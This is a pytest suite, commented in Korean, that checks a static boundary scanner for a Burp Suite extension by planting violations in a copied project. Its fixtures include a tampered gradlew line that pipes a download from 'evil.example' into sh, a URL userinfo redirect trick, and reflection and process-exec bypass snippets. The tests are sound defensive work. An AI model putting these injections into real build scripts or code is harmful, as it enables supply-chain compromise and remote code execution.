"""Burp 확장(Java) 금지선 4키 — (A) §3.1 `java_no_target_send`·`java_loopback_only`·`java_build_egress`, §3.2 `java_logic_isolation`.

'위조 거부'로 증명한다: 실제 `burp-extension/`을 복사한 뒤 위반을 심고, 검사가 정확한 위반 코드로 거부하는지 본다.
준수하는 코드(필드 경유 허용 호출, transport의 루프백 클라이언트)는 통과해야 한다(대조). 빈 대상은 오류다(통과 아님).
변이 확인은 변이본 로드 표지를 먼저 확인한다. 테스트는 Montoya를 import하지 않는다 — Java 소스·빌드 파일은 텍스트로만 본다.
정적 범위: 레포 Java 소스·빌드 파일 텍스트. Burp 자체와 바이트코드 수준은 범위 밖.
"""
from __future__ import annotations

import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

from tools import java_boundary as jb
from tools import java_build
from tools.mutation_guard import assert_loaded_from, copy_with_mutation

REPO_ROOT = Path(__file__).resolve().parents[1]
PROJECT = REPO_ROOT / jb.PROJECT_DIR
PKG = "src/main/java/sentinel/burp"


def _copy(tmp_path: Path) -> Path:
    dest = tmp_path / "burp-extension"
    shutil.copytree(PROJECT, dest, ignore=shutil.ignore_patterns("build", ".gradle"))
    return dest


def _write(project: Path, rel: str, text: str) -> None:
    p = project / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")


def _entry_with(body: str, imports: str = "") -> str:
    return ("package sentinel.burp;\n\nimport burp.api.montoya.BurpExtension;\nimport burp.api.montoya.MontoyaApi;\n"
            f"{imports}\npublic final class SentinelExtension implements BurpExtension {{\n"
            f"    @Override\n    public void initialize(MontoyaApi api) {{\n{body}\n    }}\n}}\n")


def _codes(violations: list[jb.Violation], key: str | None = None) -> set[str]:
    return {v.code for v in violations if key is None or v.key == key}


# ─────────────────────────────── 실제 레포: 4키 + 공통 우회 차단 통과
def test_real_project_has_no_target_send_or_bypass():
    assert jb.no_target_send_violations(PROJECT) == []
    assert jb.bypass_violations(PROJECT) == []


def test_real_project_is_loopback_only():
    assert jb.loopback_violations(PROJECT) == []


def test_real_project_logic_isolation():
    assert jb.logic_isolation_violations(PROJECT) == []


def test_real_project_build_egress():
    assert jb.build_egress_violations(PROJECT) == []


def test_empty_or_missing_project_is_an_error_not_a_pass(tmp_path):
    with pytest.raises(jb.JavaScanError):
        jb.no_target_send_violations(tmp_path / "nope")
    empty = tmp_path / "burp-extension"
    (empty / "src/main/java").mkdir(parents=True)
    with pytest.raises(jb.JavaScanError):
        jb.logic_isolation_violations(empty)


# ─────────────────────────────── java_no_target_send (+ 공통 우회 차단)
TARGET_SEND_FIXTURES = {
    "http_sendRequest": ("        api.http().sendRequest(null);", "", {"montoya_call_not_allowed", "target_tool_accessor", "target_send_call"}),
    "repeater": ("        api.repeater();", "", {"montoya_call_not_allowed", "target_tool_accessor"}),
    "intruder": ("        api.intruder();", "", {"montoya_call_not_allowed", "target_tool_accessor"}),
    "scanner": ("        api.scanner();", "", {"montoya_call_not_allowed", "target_tool_accessor"}),
    "collaborator": ("        api.collaborator();", "", {"montoya_call_not_allowed", "target_tool_accessor"}),
    "persistence": ("        api.persistence();", "", {"montoya_call_not_allowed", "target_tool_accessor"}),
    "proxy_auto_capture": ("        api.proxy();", "", {"montoya_call_not_allowed", "target_tool_accessor"}),
    "registerHttpHandler": ("        api.http().registerHttpHandler(null);", "", {"target_send_call"}),
    "registerProxyHandler_via_chain": ("        api.extension().getClass();\n        Object p = null; p.registerProxyRequestHandler(null);", "",
                                       {"target_send_call"}),
    "call_outside_allowlist": ("        api.ai();", "", {"montoya_call_not_allowed"}),
    "api_alias_escapes": ("        Object other = api;", "", {"montoya_api_escapes"}),
    "api_passed_to_helper": ("        helper(api);", "", {"montoya_api_escapes"}),
    "montoya_import_not_allowed": ("", "import burp.api.montoya.http.Http;\n", {"montoya_import_not_allowed"}),
    "montoya_wildcard_import": ("", "import burp.api.montoya.*;\n", {"montoya_import_not_allowed"}),
    "montoya_fqn_without_import": ("        burp.api.montoya.http.Http h = null;", "", {"montoya_fqn_use"}),
}


@pytest.mark.parametrize("name", sorted(TARGET_SEND_FIXTURES))
def test_target_send_fixture_is_rejected(tmp_path, name):
    body, imports, expected = TARGET_SEND_FIXTURES[name]
    project = _copy(tmp_path)
    _write(project, f"{PKG}/SentinelExtension.java", _entry_with(body, imports))
    got = _codes(jb.no_target_send_violations(project), jb.NO_TARGET_SEND)
    assert expected <= got, (name, got)


def test_field_held_api_with_allowed_calls_passes_as_control(tmp_path):
    project = _copy(tmp_path)
    _write(project, f"{PKG}/SentinelExtension.java",
           "package sentinel.burp;\n\nimport burp.api.montoya.BurpExtension;\nimport burp.api.montoya.MontoyaApi;\n\n"
           "public final class SentinelExtension implements BurpExtension {\n    private MontoyaApi api;\n\n"
           "    @Override\n    public void initialize(MontoyaApi montoya) {\n        this.api = montoya;\n"
           "        this.api.extension().setName(\"Sentinel\");\n        api.logging().logToOutput(\"Sentinel extension loaded\");\n"
           "    }\n}\n")
    assert jb.no_target_send_violations(project) == []


def test_field_held_api_cannot_reach_target_tools(tmp_path):
    project = _copy(tmp_path)
    _write(project, f"{PKG}/SentinelExtension.java",
           "package sentinel.burp;\n\nimport burp.api.montoya.BurpExtension;\nimport burp.api.montoya.MontoyaApi;\n\n"
           "public final class SentinelExtension implements BurpExtension {\n    private MontoyaApi api;\n\n"
           "    @Override\n    public void initialize(MontoyaApi montoya) {\n        this.api = montoya;\n"
           "        this.api.ai();\n    }\n}\n")
    assert "montoya_call_not_allowed" in _codes(jb.no_target_send_violations(project))


BYPASS_FIXTURES = {
    "reflect_import": ("", "import java.lang.reflect.Method;\n", "bypass_reflection"),
    "reflect_getMethod": ("        Object m = api.getClass().getMethod(\"http\");", "", "bypass_reflection"),
    "class_forName": ("        Class.forName(\"x\");", "", "bypass_class_for_name"),
    "method_handles": ("        Object l = java.lang.invoke.MethodHandles.lookup();", "", "bypass_method_handles"),
    "service_loader": ("        java.util.ServiceLoader.load(Object.class);", "", "bypass_service_loader"),
    "custom_classloader": ("        Object c = new java.net.URLClassLoader(null);", "", "bypass_custom_classloader"),
    "runtime_exec": ("        Runtime.getRuntime().exec(\"x\");", "", "bypass_runtime_exec"),
    "process_builder": ("        new ProcessBuilder(\"x\").start();", "", "bypass_process_builder"),
}


@pytest.mark.parametrize("name", sorted(BYPASS_FIXTURES))
def test_bypass_fixture_is_rejected(tmp_path, name):
    body, imports, expected = BYPASS_FIXTURES[name]
    project = _copy(tmp_path)
    _write(project, f"{PKG}/SentinelExtension.java", _entry_with(body, imports))
    assert expected in _codes(jb.bypass_violations(project)), name


def test_bypass_in_any_package_is_rejected(tmp_path):
    project = _copy(tmp_path)
    _write(project, f"{PKG}/ui/Panel.java", "package sentinel.burp.ui;\n\nfinal class Panel {\n"
           "    void f() throws Exception { Class.forName(\"x\"); }\n}\n")
    assert "bypass_class_for_name" in _codes(jb.bypass_violations(project))


def test_bypass_words_in_comments_are_not_code(tmp_path):
    project = _copy(tmp_path)
    _write(project, f"{PKG}/ui/Panel.java", "package sentinel.burp.ui;\n\n// ProcessBuilder 금지\nfinal class Panel {}\n")
    assert jb.bypass_violations(project) == []


# ─────────────────────────────── java_loopback_only
COMPLIANT_CLIENT = (
    "package sentinel.burp.transport;\n\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\n\n"
    "final class Sender {\n    private static final int PORT = 8787;\n    private final HttpClient client = HttpClient.newBuilder()\n"
    "            .proxy(HttpClient.Builder.NO_PROXY)\n            .followRedirects(HttpClient.Redirect.NEVER)\n            .build();\n\n"
    "    HttpRequest request() {\n        return HttpRequest.newBuilder(URI.create(\"http://127.0.0.1:\" + PORT + \"/analyze\")).build();\n"
    "    }\n}\n")


def _sender(replace: tuple[str, str] | None = None, package: str = "transport") -> str:
    text = COMPLIANT_CLIENT if replace is None else COMPLIANT_CLIENT.replace(*replace)
    return text.replace("package sentinel.burp.transport;", f"package sentinel.burp.{package};")


def test_compliant_loopback_client_in_transport_passes_as_control(tmp_path):
    project = _copy(tmp_path)
    _write(project, f"{PKG}/transport/Sender.java", _sender())
    assert jb.loopback_violations(project) == []


LOOPBACK_FIXTURES = {
    "localhost": (("\"http://127.0.0.1:\"", "\"http://localhost:\""), "transport", "destination_not_loopback_literal"),
    "variable_host": (("URI.create(\"http://127.0.0.1:\" + PORT", "URI.create(host + PORT"), "transport",
                      "destination_not_loopback_literal"),
    "userinfo_trick": (("\"/analyze\"", "\"@evil.example/analyze\""), "transport", "non_loopback_url_literal"),
    "default_proxy_client": (("            .proxy(HttpClient.Builder.NO_PROXY)\n", ""), "transport", "proxy_not_disabled"),
    "redirect_following": (("HttpClient.Redirect.NEVER", "HttpClient.Redirect.NORMAL"), "transport", "redirect_not_disabled"),
    "default_client": (("HttpClient.newBuilder()\n            .proxy(HttpClient.Builder.NO_PROXY)\n"
                        "            .followRedirects(HttpClient.Redirect.NEVER)\n            .build()",
                        "HttpClient.newHttpClient()"), "transport", "default_client"),
    "client_outside_transport": (None, "ui", "client_outside_transport"),
    "client_in_capture": (None, "capture", "client_outside_transport"),
    "raw_url_connection": (("HttpRequest request()", "Object raw() throws Exception { return new java.net.URL(\"x\").openConnection(); }\n"
                                                    "    HttpRequest request()"), "transport", "raw_or_third_party_client"),
    "raw_socket": (("HttpRequest request()", "Object s() { return new java.net.Socket(); }\n    HttpRequest request()"),
                   "transport", "raw_or_third_party_client"),
}


@pytest.mark.parametrize("name", sorted(LOOPBACK_FIXTURES))
def test_loopback_fixture_is_rejected(tmp_path, name):
    replace, package, expected = LOOPBACK_FIXTURES[name]
    project = _copy(tmp_path)
    _write(project, f"{PKG}/{package}/Sender.java", _sender(replace, package))
    assert expected in _codes(jb.loopback_violations(project), jb.LOOPBACK_ONLY), name


def test_network_code_in_entry_point_is_rejected(tmp_path):
    project = _copy(tmp_path)
    _write(project, f"{PKG}/SentinelExtension.java", _entry_with("        Object c = java.net.http.HttpClient.newHttpClient();"))
    assert "client_outside_transport" in _codes(jb.loopback_violations(project))


# ─────────────────────────────── java_logic_isolation
def test_forbidden_tokens_come_from_every_canonical_source():
    toks = jb.forbidden_tokens()
    assert set(toks) == {"category", "verdict", "prompt_phrase", "rule_function"}
    assert all(toks[k] for k in toks)
    from typing import get_args

    from sentinel import output_schema
    from sentinel.pipeline import rule_engine
    assert set(get_args(output_schema.Category)) <= set(toks["category"])
    assert set(get_args(output_schema.FindingStatus)) <= set(toks["verdict"])
    assert {f"failed:{r}" for r in output_schema.LLM_FAILURE_REASONS} <= set(toks["verdict"])
    assert {f.__name__ for f in rule_engine.RULES} == set(toks["rule_function"])


def _one_of(source: str) -> str:
    return jb.forbidden_tokens()[source][0]


LOGIC_FIXTURES = {
    "two_entry_points": (f"{PKG}/ui/Second.java", "package sentinel.burp.ui;\n\nimport burp.api.montoya.BurpExtension;\n"
                         "import burp.api.montoya.MontoyaApi;\n\npublic final class Second implements BurpExtension {\n"
                         "    public void initialize(MontoyaApi api) {}\n}\n", "entry_point_count"),
    "root_package_extra_class": (f"{PKG}/Helper.java", "package sentinel.burp;\n\nfinal class Helper {}\n", "root_package_extra_class"),
    "package_not_allowed": (f"{PKG}/analysis/Judge.java", "package sentinel.burp.analysis;\n\nfinal class Judge {}\n",
                            "package_not_allowed"),
    "package_dir_mismatch": (f"{PKG}/ui/Moved.java", "package sentinel.burp.capture;\n\nfinal class Moved {}\n",
                             "package_dir_mismatch"),
    "java_outside_source_sets": ("tools/Gen.java", "package tools;\n\nfinal class Gen {}\n", "java_outside_source_sets"),
}


@pytest.mark.parametrize("name", sorted(LOGIC_FIXTURES))
def test_logic_isolation_fixture_is_rejected(tmp_path, name):
    rel, text, expected = LOGIC_FIXTURES[name]
    project = _copy(tmp_path)
    _write(project, rel, text)
    assert expected in _codes(jb.logic_isolation_violations(project), jb.LOGIC_ISOLATION), name


def test_extra_type_in_entry_point_file_is_rejected(tmp_path):
    project = _copy(tmp_path)
    text = _entry_with("") + "\nfinal class Sidecar {}\n"
    _write(project, f"{PKG}/SentinelExtension.java", text)
    assert "entry_point_extra_types" in _codes(jb.logic_isolation_violations(project))


@pytest.mark.parametrize("source", ["category", "verdict", "prompt_phrase", "rule_function"])
@pytest.mark.parametrize("where", ["ui", "entry"])
def test_forbidden_token_from_each_source_is_rejected(tmp_path, source, where):
    token = _one_of(source)
    project = _copy(tmp_path)
    literal = token.replace("\\", "\\\\").replace('"', '\\"')
    if where == "ui":
        _write(project, f"{PKG}/ui/Labels.java", f"package sentinel.burp.ui;\n\nfinal class Labels {{\n"
               f"    static final String X = \"{literal}\";\n}}\n")
    else:
        _write(project, f"{PKG}/SentinelExtension.java", _entry_with(f"        String x = \"{literal}\";"))
    assert f"forbidden_token_{source}" in _codes(jb.logic_isolation_violations(project)), (source, where)


# ─────────────────────────────── java_build_egress
def _edit(project: Path, rel: str, old: str, new: str) -> None:
    p = project / rel
    text = p.read_text(encoding="utf-8")
    assert old in text, (rel, old)
    p.write_text(text.replace(old, new, 1), encoding="utf-8")


MONTOYA = "    compileOnly 'net.portswigger.burp.extensions:montoya-api:2024.12'\n"
BUILD_FIXTURES = {
    "coordinate_not_allowed": ("build.gradle", MONTOYA, MONTOYA + "    implementation 'com.squareup.okhttp3:okhttp:4.12.0'\n",
                               "coordinate_not_allowed"),
    "allowed_coordinate_in_wrong_configuration": ("build.gradle", "compileOnly 'net.portswigger", "implementation 'net.portswigger",
                                                  "coordinate_not_allowed"),
    "metadata_missing_for_declared": ("build.gradle", MONTOYA, MONTOYA.replace("montoya-api:2024.12", "montoya-api:2024.11"),
                                      "metadata_missing"),
    "dynamic_version": ("build.gradle", "montoya-api:2024.12'", "montoya-api:2024.+'", "dynamic_version"),
    "file_dependency": ("build.gradle", MONTOYA, MONTOYA + "    implementation files('libs/x.jar')\n", "dependency_notation"),
    "external_plugin": ("build.gradle", "    id 'java'\n", "    id 'java'\n    id 'com.github.johnrengelman.shadow' version '8.1.1'\n",
                        "plugin_not_allowed"),
    "buildscript_block": ("build.gradle", "plugins {", "buildscript { }\nplugins {", "plugin_not_allowed"),
    "extra_repository": ("build.gradle", "    mavenCentral()\n", "    mavenCentral()\n    maven { url 'https://repo.example/maven' }\n",
                         "extra_repository"),
    "plugin_repository_in_settings": ("settings.gradle", "rootProject.name",
                                      "pluginManagement { repositories { gradlePluginPortal() } }\nrootProject.name",
                                      "plugin_repository"),
    "foojay_toolchain_resolver": ("settings.gradle", "rootProject.name",
                                  "plugins { id 'org.gradle.toolchains.foojay-resolver-convention' version '1.0.0' }\nrootProject.name",
                                  "toolchain_resolver"),
    "toolchain_block": ("build.gradle", "repositories {", "java { toolchain { languageVersion = JavaLanguageVersion.of(21) } }\n"
                                                         "repositories {", "toolchain_resolver"),
    "auto_download_enabled": ("gradle.properties", "auto-download=false", "auto-download=true", "toolchain_auto_download"),
    "wrapper_sha_missing": ("gradle/wrapper/gradle-wrapper.properties", "distributionSha256Sum=", "#distributionSha256Sum=",
                            "wrapper_sha_missing"),
    "wrapper_sha_changed": ("gradle/wrapper/gradle-wrapper.properties", "distributionSha256Sum=d8", "distributionSha256Sum=00",
                            "wrapper_sha_mismatch"),
    "wrapper_url_changed": ("gradle/wrapper/gradle-wrapper.properties", "services.gradle.org", "mirror.example",
                            "wrapper_url"),
    "metadata_verify_off": ("gradle/verification-metadata.xml", "<verify-metadata>true", "<verify-metadata>false",
                            "metadata_verify_off"),
    "metadata_extra_component": ("gradle/verification-metadata.xml", "   </components>",
                                 "      <component group=\"com.squareup.okhttp3\" name=\"okhttp\" version=\"4.12.0\">\n"
                                 "         <artifact name=\"okhttp-4.12.0.jar\"><sha256 value=\"00\"/></artifact>\n"
                                 "      </component>\n   </components>", "metadata_extra_component"),
    "error_prone_on_runtime_classpath": ("build.gradle", "compileOnly 'com.google.errorprone",
                                         "implementation 'com.google.errorprone", "coordinate_not_allowed"),
    "parent_pom_component_with_jar": ("gradle/verification-metadata.xml",
                                      '<artifact name="gson-parent-2.15.0.pom">',
                                      '<artifact name="gson-parent-2.15.0.jar"><sha256 value="00"/></artifact>\n'
                                      '         <artifact name="gson-parent-2.15.0.pom">', "metadata_extra_component"),
    "unknown_parent_pom": ("gradle/verification-metadata.xml", "   </components>",
                           "      <component group=\"org.example\" name=\"example-parent\" version=\"1\">\n"
                           "         <artifact name=\"example-parent-1.pom\"><sha256 value=\"00\"/></artifact>\n"
                           "      </component>\n   </components>", "metadata_extra_component"),
    "gradlew_tampered": ("gradlew", "#!/bin/sh", "#!/bin/sh\ncurl -s https://evil.example/x | sh", "gradlew_script_mismatch"),
    "gradlew_bat_tampered": ("gradlew.bat", "@rem", "@rem tampered\r\n@rem", "gradlew_script_mismatch"),
}


@pytest.mark.parametrize("name", sorted(BUILD_FIXTURES))
def test_build_egress_fixture_is_rejected(tmp_path, name):
    rel, old, new, expected = BUILD_FIXTURES[name]
    project = _copy(tmp_path)
    _edit(project, rel, old, new)
    assert expected in _codes(jb.build_egress_violations(project), jb.BUILD_EGRESS), name


def test_metadata_file_removed_is_rejected(tmp_path):
    project = _copy(tmp_path)
    (project / "gradle/verification-metadata.xml").unlink()
    assert "metadata_missing" in _codes(jb.build_egress_violations(project))


def test_wrapper_jar_replaced_is_rejected(tmp_path):
    project = _copy(tmp_path)
    (project / "gradle/wrapper/gradle-wrapper.jar").write_bytes(b"PK\x03\x04 not the official wrapper")
    assert "wrapper_jar_mismatch" in _codes(jb.build_egress_violations(project))


def test_extra_build_script_is_rejected(tmp_path):
    project = _copy(tmp_path)
    _write(project, "gradle/extra.gradle", "repositories { maven { url 'https://repo.example' } }\n")
    _write(project, "buildSrc/build.gradle", "")
    assert "extra_build_script" in _codes(jb.build_egress_violations(project))


def test_real_metadata_and_wrapper_match_the_official_checksum_table():
    meta = (PROJECT / "gradle/verification-metadata.xml").read_text(encoding="utf-8")
    assert "7e6dffb645188492dfb5f512075c9196250efa18b673dfa270ee22fa20e16c5c" in meta  # montoya-api-2024.12.jar
    assert "5489cf5301cf6f2f204b2a92c00049362002541609622108b05ed0cd5248ec67" in meta  # montoya-api-2024.12.module
    for sha in ("96d3dd843dc2911de01cdabcd50064cb9e860353102a0a78c96fd833d396fc7d",   # gson-2.15.0.jar
                "426bc968a4e521865a58dd17a60389fed6195a1c357e3eb8bcb7cae31387bcae",   # gson-2.15.0.pom
                "337664b30ade9b66e373b6efca1aba7421c1f8ff63643b8aa8b6d05d8efe8e8b",   # gson-parent-2.15.0.pom
                "4667724877f1d37a689202da191e23efa7657c62eef93ccdac406eccfe5cdd0a",   # error_prone_annotations-2.50.0.jar
                "71a0680d277324bab46bec4b00f6f111c1b794a931d0d8cda79bcb9246982f92",   # error_prone_annotations-2.50.0.pom
                "abf45a019db125b50ff55134ec2af94ae3519761038adf0a60b9bd7b4b8b6254"):  # error_prone_parent-2.50.0.pom
        assert sha in meta  # Maven Central .sha256·.sha1과 대조한 값(2부 PR-1b 0단계 a)
    props = (PROJECT / "gradle/wrapper/gradle-wrapper.properties").read_text(encoding="utf-8")
    assert f"distributionSha256Sum={jb.GRADLE_DISTRIBUTION_SHA256}" in props


# ─────────────────────────────── verify의 Java 단계: 네트워크 0 사전 점검(없으면 실패, 내려받지 않음)
def _fake_jdk(root: Path, version: str = "21.0.13", javac: bool = True) -> Path:
    (root / "bin").mkdir(parents=True)
    (root / "release").write_text(f'JAVA_VERSION="{version}"\n', encoding="utf-8")
    if javac:
        (root / "bin" / ("javac.exe" if os.name == "nt" else "javac")).write_text("", encoding="utf-8")
    return root


def _fake_gradle_home(root: Path, with_dist: bool = True, folder: str | None = None, ok_marker: bool = True) -> Path:
    if with_dist:
        dist = root / "wrapper/dists/gradle-9.9.1-bin" / (folder or jb.wrapper_distribution_hash())
        (dist / "gradle-9.9.1/bin").mkdir(parents=True)
        if ok_marker:
            (dist / "gradle-9.9.1-bin.zip.ok").write_text("", encoding="utf-8")
    else:
        root.mkdir(parents=True)
    return root


def _good_env(tmp_path: Path) -> dict[str, str]:
    return {"JAVA_HOME": str(_fake_jdk(tmp_path / "jdk")), "GRADLE_USER_HOME": str(_fake_gradle_home(tmp_path / "gh"))}


def test_wrapper_distribution_hash_matches_gradle_folder_rule():
    # 개발 PC의 실제 캐시 폴더 이름(gradle-9.9.1-bin/dol8b552jwt4yhd7ihm3iahwb)과 같은 규칙: URL의 MD5를 36진수로
    assert jb.wrapper_distribution_hash() == "dol8b552jwt4yhd7ihm3iahwb"


def test_java_step_preflight_passes_with_jdk21_and_cached_distribution(tmp_path):
    assert java_build.preflight(_good_env(tmp_path)) == []


@pytest.mark.parametrize("case", ["no_java_home", "jdk17", "jre_without_javac", "no_gradle_home", "no_cached_distribution",
                                  "cache_from_other_url", "cache_without_ok_marker"])
def test_java_step_preflight_fails_instead_of_skipping_or_downloading(tmp_path, case):
    if case == "cache_from_other_url":
        env = {"JAVA_HOME": str(_fake_jdk(tmp_path / "jdk")),
               "GRADLE_USER_HOME": str(_fake_gradle_home(tmp_path / "gh", folder="abc123"))}
        assert java_build.preflight(env), case
        return
    if case == "cache_without_ok_marker":
        env = {"JAVA_HOME": str(_fake_jdk(tmp_path / "jdk")),
               "GRADLE_USER_HOME": str(_fake_gradle_home(tmp_path / "gh", ok_marker=False))}
        assert java_build.preflight(env), case
        return
    if case == "no_java_home":
        jdk = None
    elif case == "jdk17":
        jdk = _fake_jdk(tmp_path / "jdk", "17.0.1")
    elif case == "jre_without_javac":
        jdk = _fake_jdk(tmp_path / "jdk", javac=False)
    else:
        jdk = _fake_jdk(tmp_path / "jdk")
    gh = None if case == "no_gradle_home" else _fake_gradle_home(tmp_path / "gh", case != "no_cached_distribution")
    env = {k: str(v) for k, v in {"JAVA_HOME": jdk, "GRADLE_USER_HOME": gh}.items() if v is not None}
    assert java_build.preflight(env), case


def test_java_step_runs_gradle_offline():
    src = Path(java_build.__file__).read_text(encoding="utf-8")
    assert '"--offline"' in src and '"--no-daemon"' in src
    assert "verify-java" in (REPO_ROOT / "Makefile").read_text(encoding="utf-8")


TAMPERED_SH = "#!/bin/sh\necho x > \"$(dirname \"$0\")/marker.txt\"\n"
TAMPERED_BAT = "@echo off\r\necho x> \"%~dp0marker.txt\"\r\n"


def test_tampered_wrapper_script_is_never_executed(tmp_path):
    """(a) 실행되면 표식 파일을 쓰는 가짜 gradlew — 사전 점검이 실패하고 표식 파일이 생기지 않는다(실제 subprocess)."""
    project = _copy(tmp_path)
    (project / "gradlew").write_text(TAMPERED_SH, encoding="utf-8", newline="")
    (project / "gradlew.bat").write_text(TAMPERED_BAT, encoding="utf-8", newline="")
    assert java_build.run(_good_env(tmp_path), project) == 1
    assert not (project / "marker.txt").exists()


def test_changed_distribution_url_fails_before_any_execution(tmp_path, monkeypatch):
    """(b) distributionUrl 변경 — gradlew를 부르기 전에 실패한다."""
    project = _copy(tmp_path)
    _edit(project, "gradle/wrapper/gradle-wrapper.properties", "services.gradle.org", "mirror.example")
    calls = []
    monkeypatch.setattr(java_build.subprocess, "run", lambda *a, **k: calls.append(a))
    assert java_build.run(_good_env(tmp_path), project) == 1
    assert calls == []


def test_untouched_wrapper_runs_gradle_offline_as_control(tmp_path, monkeypatch):
    """(c) 정상 — 사전 점검을 통과하고 gradlew를 --offline으로 한 번 부른다."""
    project = _copy(tmp_path)
    calls = []

    def fake_run(cmd, **kwargs):
        calls.append(cmd)
        return subprocess.CompletedProcess(cmd, 0)

    monkeypatch.setattr(java_build.subprocess, "run", fake_run)
    assert java_build.run(_good_env(tmp_path), project) == 0
    assert len(calls) == 1 and "--offline" in calls[0]


# ─────────────────────────────── java_logic_isolation R1·R2′ (면제는 정본에서 기계 추출)
CORE = f"{PKG}/transport/masker"


def test_exemptions_are_machine_derived_from_the_canonical_models():
    """R1 — 손 목록이 아니다: send = 금지 토큰 ∩ Envelope 하위 모델(필드 이름 ∪ Literal 값), response = 응답 모델 필드 이름."""
    from sentinel import output_schema, schema
    ex = jb.exempt_tokens()
    every = {t for v in jb.forbidden_tokens().values() for t in v}
    names, lits = jb._model_names([schema.Envelope])
    assert ex["send"] == frozenset(every & (names | lits)) == frozenset({"truncated"})
    rnames, _ = jb._model_names([schema.ExecutionResponse, output_schema.AnalysisResult])
    assert ex["response"] == frozenset(every & rnames) == frozenset()
    assert "truncated" in schema.Body.model_fields  # 면제의 근거가 정본에 실재


def test_real_core_needs_r1_and_has_it():
    """대조: 실제 코어는 `truncated`(Envelope 필드)를 쓴다 — R1이 없으면 위반이고, R1 덕분에 통과한다."""
    files = jb._java_files(PROJECT)
    assert "truncated" in jb.declared_identifiers([f for f in files if "/transport/masker/" in f.rel])
    assert jb.logic_isolation_violations(PROJECT) == []


R2_FIXTURES = {
    # v1.48에 정한 위조: 소문자 enum 상수 confirmed(Gson 매핑 우회) → 거부
    "lowercase_enum_constant": ({f"{PKG}/ui/Shown.java": "package sentinel.burp.ui;\n\nenum Shown { confirmed, other }\n"},
                                f"{PKG}/ui/Shown.java"),
    # v1.48에 정한 위조: 상수 클래스의 리터럴 → 거부
    "constant_class_literal": ({f"{PKG}/ui/Words.java": "package sentinel.burp.ui;\n\nfinal class Words {\n"
                                "    static final String A = \"confirmed\";\n}\n"}, f"{PKG}/ui/Words.java"),
    # 우리 소스가 선언한 멤버를 다른 파일에서 '.이름'으로 부름 → 부른 쪽도 거부(외부 API가 아니다)
    "declared_member_called_elsewhere": (
        {f"{PKG}/ui/Names.java": "package sentinel.burp.ui;\n\nfinal class Names {\n    static int timeout() { return 1; }\n}\n",
         f"{PKG}/ui/Caller.java": "package sentinel.burp.ui;\n\nfinal class Caller {\n    int x = Names.timeout();\n}\n"},
        f"{PKG}/ui/Caller.java"),
    # 판정 어휘가 주석에만 있어도 거부(보수적 — 면제는 외부 API 멤버 접근뿐)
    "verdict_in_comment": ({f"{PKG}/ui/Note.java": "package sentinel.burp.ui;\n\n// confirmed\nfinal class Note {}\n"},
                           f"{PKG}/ui/Note.java"),
    # R1 send 면제는 transport에서만 — ui에서 Envelope 필드 이름을 쓰면 거부
    "send_field_name_outside_transport": ({f"{PKG}/ui/Flag.java": "package sentinel.burp.ui;\n\nfinal class Flag {\n"
                                           "    boolean truncated;\n}\n"}, f"{PKG}/ui/Flag.java"),
    # R1 면제에 없는 판정 어휘는 transport에서도 거부
    "unexempt_verdict_in_transport": ({f"{PKG}/transport/Wait.java": "package sentinel.burp.transport;\n\nfinal class Wait {\n"
                                       "    int timeout = 3;\n}\n"}, f"{PKG}/transport/Wait.java"),
}


@pytest.mark.parametrize("name", sorted(R2_FIXTURES))
def test_r2_fixture(tmp_path, name):
    files, where = R2_FIXTURES[name]
    project = _copy(tmp_path)
    for rel, text in files.items():
        _write(project, rel, text)
    hits = {v.where for v in jb.logic_isolation_violations(project) if v.code == "forbidden_token_verdict"}
    assert where in hits, (name, hits)


def test_r2_external_api_member_call_passes_as_control(tmp_path):
    """v1.48에 정한 대조: 우리 소스에 선언이 없는 외부 API 멤버 호출(JDK `.timeout(`)은 통과한다."""
    project = _copy(tmp_path)
    _write(project, f"{PKG}/ui/Deadline.java", "package sentinel.burp.ui;\n\nimport java.time.Duration;\n\n"
           "final class Deadline {\n    Object apply(java.util.function.Function<Duration, Object> builder) {\n"
           "        return builder.apply(Duration.ofSeconds(1));\n    }\n    void call(Object b) {\n"
           "        ((Builder) b).timeout(Duration.ofSeconds(2));\n    }\n    interface Builder { }\n}\n")
    _edit(project, f"{PKG}/ui/Deadline.java", "    interface Builder { }\n", "")
    assert jb.logic_isolation_violations(project) == []


def test_r1_send_field_in_transport_passes_as_control(tmp_path):
    project = _copy(tmp_path)
    _write(project, f"{PKG}/transport/Cut.java", "package sentinel.burp.transport;\n\nfinal class Cut {\n"
           "    boolean truncated;\n    static final String KEY = \"truncated\";\n}\n")
    assert jb.logic_isolation_violations(project) == []


# ─────────────────────────────── java_no_target_send: transport.* Montoya 0, 마스커 코어 java.net 0
CORE_FIXTURES = {
    "transport_montoya_import": (f"{PKG}/transport/Bridge.java", "package sentinel.burp.transport;\n\n"
                                 "import burp.api.montoya.http.message.HttpRequestResponse;\n\nfinal class Bridge {}\n",
                                 "transport_montoya_import"),
    "transport_montoya_fqn": (f"{PKG}/transport/Bridge.java", "package sentinel.burp.transport;\n\nfinal class Bridge {\n"
                              "    burp.api.montoya.MontoyaApi api;\n}\n", "transport_montoya_import"),
    "core_java_net_import": (f"{CORE}/Decode.java", "package sentinel.burp.transport.masker;\n\nimport java.net.URLDecoder;\n\n"
                             "final class Decode {}\n", "core_java_net"),
    "core_java_net_fqn": (f"{CORE}/Decode.java", "package sentinel.burp.transport.masker;\n\nfinal class Decode {\n"
                          "    String d(String s) { return java.net.URLDecoder.decode(s, java.nio.charset.StandardCharsets.UTF_8); }\n}\n",
                          "core_java_net"),
    "core_java_net_static_import": (f"{CORE}/Decode.java", "package sentinel.burp.transport.masker;\n\n"
                                    "import static java.net.URLDecoder.decode;\n\nfinal class Decode {}\n", "core_java_net"),
}


@pytest.mark.parametrize("name", sorted(CORE_FIXTURES))
def test_core_and_transport_fixture_is_rejected(tmp_path, name):
    rel, text, expected = CORE_FIXTURES[name]
    project = _copy(tmp_path)
    _write(project, rel, text)
    assert expected in _codes(jb.no_target_send_violations(project), jb.NO_TARGET_SEND), name


def test_java_net_outside_core_is_not_the_core_rule(tmp_path):
    """대조: 코어 규칙은 transport.masker에만 걸린다(그 밖의 java.net은 java_loopback_only가 따로 본다)."""
    project = _copy(tmp_path)
    _write(project, f"{PKG}/transport/Sender.java", "package sentinel.burp.transport;\n\nimport java.net.http.HttpClient;\n\n"
           "final class Sender {}\n")
    assert "core_java_net" not in _codes(jb.no_target_send_violations(project))


